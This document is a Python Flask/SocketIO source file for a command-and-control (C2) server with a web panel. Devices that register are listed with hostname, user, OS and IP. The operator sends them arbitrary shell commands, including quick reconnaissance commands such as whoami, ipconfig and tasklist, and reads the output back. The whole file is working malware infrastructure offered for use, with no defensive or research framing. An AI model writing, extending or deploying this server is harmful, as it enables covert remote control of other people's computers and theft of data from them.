#!/usr/bin/env python3
"""
C2 SERVER - Render.com Compatible Version
Lightweight - No OpenCV required
"""

from flask import Flask, request, jsonify, send_file, Response, render_template_string
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
import json
from collections import defaultdict
import io
from PIL import Image

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB

# SocketIO with threading
socketio = SocketIO(app, 
                   cors_allowed_origins="*",
                   async_mode='threading',
                   logger=False,
                   engineio_logger=False)

# Storage
for dir in ['uploads', 'downloads', 'screenshots', 'logs']:
    os.makedirs(dir, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
connected_controllers = set()

# Password
WEB_PASSWORD = "admin123"  # CHANGE THIS!

print("""
╔══════════════════════════════════════════════════════╗
║           C2 WEB CONTROL PANEL v2.0                  ║
║          Lightweight - Render.com Ready              ║
╚══════════════════════════════════════════════════════╝
""")

# ============= WEB CONTROL PANEL =============

@app.route('/')
def index():
    """Main web control panel"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Web Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
                color: #e0e0ff;
                min-height: 100vh;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                background: rgba(0, 0, 0, 0.7);
                padding: 25px;
                border-radius: 15px;
                border: 1px solid #00aaff;
                box-shadow: 0 0 30px rgba(0, 170, 255, 0.3);
                margin-bottom: 30px;
                text-align: center;
            }
            h1 {
                color: #00aaff;
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: rgba(0, 0, 0, 0.6);
                border-radius: 10px;
                padding: 20px;
                border: 1px solid #333355;
            }
            .stat-number {
                font-size: 2.5em;
                font-weight: bold;
                color: #00ffaa;
            }
            .client-list {
                background: rgba(0, 0, 0, 0.7);
                border-radius: 15px;
                padding: 25px;
                border: 1px solid #333366;
                margin-bottom: 30px;
            }
            .client-item {
                background: rgba(20, 30, 50, 0.7);
                border-radius: 8px;
                padding: 15px;
                margin-bottom: 15px;
                border: 1px solid #334477;
            }
            .client-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            .client-name {
                font-weight: bold;
                color: #88ddff;
                font-size: 1.2em;
            }
            .client-status {
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 0.8em;
                font-weight: bold;
            }
            .status-online {
                background: rgba(0, 255, 0, 0.2);
                color: #00ff00;
                border: 1px solid #00ff00;
            }
            .status-offline {
                background: rgba(255, 0, 0, 0.2);
                color: #ff5555;
                border: 1px solid #ff5555;
            }
            .btn {
                padding: 10px 20px;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                transition: all 0.3s;
            }
            .btn-primary {
                background: linear-gradient(135deg, #00aaff, #0088cc);
                color: white;
            }
            .btn-primary:hover {
                background: linear-gradient(135deg, #00bbff, #0099dd);
            }
            .command-input {
                width: 100%;
                padding: 12px;
                background: rgba(0, 0, 0, 0.8);
                border: 1px solid #445588;
                border-radius: 8px;
                color: #ffffff;
                font-family: monospace;
                margin-bottom: 15px;
            }
            .log-output {
                background: rgba(0, 0, 0, 0.9);
                border: 1px solid #334477;
                border-radius: 8px;
                padding: 15px;
                height: 300px;
                overflow-y: auto;
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                color: #88ff88;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔗 C2 WEB CONTROL PANEL</h1>
                <p>Control connected devices from your browser</p>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number" id="total-clients">0</div>
                    <div>Total Devices</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="online-clients">0</div>
                    <div>Online Now</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="total-commands">0</div>
                    <div>Commands Executed</div>
                </div>
            </div>
            
            <div class="client-list">
                <h2 style="color:#00aaff;margin-bottom:20px;">📱 Connected Devices</h2>
                <div id="client-list">
                    <!-- Devices will appear here -->
                </div>
            </div>
            
            <div style="background:rgba(0,0,0,0.7);border-radius:15px;padding:25px;margin-bottom:30px;">
                <h2 style="color:#00aaff;margin-bottom:20px;">💻 Remote Command</h2>
                <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
                <button onclick="sendCommand()" class="btn btn-primary">Execute</button>
                
                <div style="margin-top:20px;">
                    <h3 style="color:#88ddff;margin-bottom:10px;">Quick Commands:</h3>
                    <div style="display:flex;gap:10px;flex-wrap:wrap;">
                        <button onclick="sendQuickCommand('whoami')" class="btn">whoami</button>
                        <button onclick="sendQuickCommand('ipconfig')" class="btn">ipconfig</button>
                        <button onclick="sendQuickCommand('dir')" class="btn">dir</button>
                        <button onclick="sendQuickCommand('tasklist')" class="btn">tasklist</button>
                    </div>
                </div>
            </div>
            
            <div style="background:rgba(0,0,0,0.7);border-radius:15px;padding:25px;">
                <h2 style="color:#00aaff;margin-bottom:20px;">📄 Command Output</h2>
                <div class="log-output" id="command-output">
                    <!-- Output will appear here -->
                </div>
            </div>
        </div>
        
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script>
            let socket = null;
            let selectedClientId = null;
            
            function initWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = protocol + '//' + window.location.host;
                
                socket = io(wsUrl);
                
                socket.on('connect', () => {
                    console.log('Connected to server');
                    socket.emit('controller_connect');
                });
                
                socket.on('client_online', (data) => {
                    addOrUpdateClient(data);
                });
                
                socket.on('client_offline', (data) => {
                    updateClientStatus(data.client_id, false);
                });
                
                socket.on('command_result', (data) => {
                    addToOutput(data);
                });
            }
            
            function addOrUpdateClient(client) {
                const list = document.getElementById('client-list');
                const clientId = client.client_id;
                
                let clientElement = document.getElementById(`client-${clientId}`);
                if (!clientElement) {
                    clientElement = document.createElement('div');
                    clientElement.className = 'client-item';
                    clientElement.id = `client-${clientId}`;
                    clientElement.onclick = () => selectClient(clientId);
                    list.appendChild(clientElement);
                }
                
                const statusClass = client.online ? 'status-online' : 'status-offline';
                const statusText = client.online ? 'ONLINE' : 'OFFLINE';
                
                clientElement.innerHTML = `
                    <div class="client-header">
                        <div class="client-name">${client.hostname || client.client_id}</div>
                        <div class="client-status ${statusClass}">${statusText}</div>
                    </div>
                    <div style="color:#aaccff;font-size:0.9em;">
                        User: ${client.username || 'Unknown'}<br>
                        OS: ${client.os || 'Unknown'}<br>
                        IP: ${client.ip || 'Unknown'}
                    </div>
                    <button onclick="selectClient('${clientId}')" style="margin-top:10px;padding:8px 15px;background:#00aaff;color:white;border:none;border-radius:4px;cursor:pointer;">
                        Select
                    </button>
                `;
                
                updateStats();
            }
            
            function selectClient(clientId) {
                selectedClientId = clientId;
                alert(`Selected device: ${clientId}`);
            }
            
            function sendCommand() {
                if (!selectedClientId) {
                    alert('Please select a device first');
                    return;
                }
                
                const command = document.getElementById('command-input').value;
                if (!command) {
                    alert('Please enter a command');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: selectedClientId,
                    command: command
                });
                
                document.getElementById('command-input').value = '';
            }
            
            function sendQuickCommand(command) {
                if (!selectedClientId) {
                    alert('Please select a device first');
                    return;
                }
                
                socket.emit('execute_command', {
                    client_id: selectedClientId,
                    command: command
                });
            }
            
            function addToOutput(data) {
                const output = document.getElementById('command-output');
                const time = new Date().toLocaleTimeString();
                
                const entry = document.createElement('div');
                entry.style.marginBottom = '10px';
                entry.innerHTML = `
                    <div style="color:#8888ff;font-size:0.9em;">[${time}] ${data.client_id}</div>
                    <div style="color:#00aaff;">Command: ${data.command || 'N/A'}</div>
                    <div style="color:#88ff88;white-space:pre-wrap;">${data.output || 'No output'}</div>
                `;
                
                output.appendChild(entry);
                output.scrollTop = output.scrollHeight;
            }
            
            function updateClientStatus(clientId, isOnline) {
                const element = document.getElementById(`client-${clientId}`);
                if (element) {
                    const statusElement = element.querySelector('.client-status');
                    if (statusElement) {
                        statusElement.className = `client-status ${isOnline ? 'status-online' : 'status-offline'}`;
                        statusElement.textContent = isOnline ? 'ONLINE' : 'OFFLINE';
                    }
                }
                updateStats();
            }
            
            function updateStats() {
                const clients = document.getElementsByClassName('client-item');
                const online = Array.from(clients).filter(c => 
                    c.querySelector('.status-online')
                ).length;
                
                document.getElementById('total-clients').textContent = clients.length;
                document.getElementById('online-clients').textContent = online;
            }
            
            window.onload = function() {
                initWebSocket();
                setInterval(updateStats, 5000);
            };
        </script>
    </body>
    </html>
    """

@app.route('/api/clients')
def api_clients():
    """Get all clients"""
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

# ============= SOCKET.IO EVENTS =============

@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_controllers:
        connected_controllers.remove(request.sid)
        print(f"[-] Controller disconnected: {request.sid}")
        return
    
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            socketio.emit('client_offline', {'client_id': client_id})
            break

@socketio.on('controller_connect')
def handle_controller_connect():
    connected_controllers.add(request.sid)
    print(f"[+] Web controller connected: {request.sid}")
    
    for client_id, client in clients.items():
        if client.get('online', False):
            socketio.emit('client_online', {
                'client_id': client_id,
                'hostname': client.get('hostname', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'platform': client.get('platform', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'online': True
            }, room=request.sid)
    
    emit('controller_ready', {'message': 'Connected to C2 server'})

@socketio.on('execute_command')
def handle_execute_command(data):
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id in client_sockets:
        cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
        cmd_obj = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        emit('command_sent', {'command_id': cmd_id, 'client_id': client_id})
    else:
        emit('command_error', {'error': 'Client offline', 'client_id': client_id})

@socketio.on('register')
def handle_register(data):
    client_id = data.get('id')
    
    if not client_id:
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': time.time(),
        'last_seen': time.time()
    }
    
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id} - {data.get('hostname')}")
    
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to C2 Server',
        'timestamp': time.time()
    })
    
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'platform': data.get('platform'),
        'ip': request.remote_addr,
        'online': True
    })
    
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result from {client_id}")
    
    result_data = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': 'completed',
        'timestamp': time.time()
    }
    
    socketio.emit('command_result', result_data)

# ============= CLEANUP THREAD =============

def cleanup_thread():
    while True:
        try:
            cutoff = time.time() - 120
            for client_id, client in list(clients.items()):
                if client.get('last_seen', 0) < cutoff and client.get('online', False):
                    clients[client_id]['online'] = False
                    socketio.emit('client_offline', {'client_id': client_id})
            
            time.sleep(60)
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
            time.sleep(60)

threading.Thread(target=cleanup_thread, daemon=True).start()

# ============= MAIN =============

def main():
    port = int(os.environ.get('PORT', 10000))
    
    print(f"[*] Starting C2 Web Control Panel on port {port}")
    print(f"[*] Web Interface: http://0.0.0.0:{port}")
    print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
    print(f"[*] Lightweight - No OpenCV required")
    print()
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)

if __name__ == '__main__':
    main()
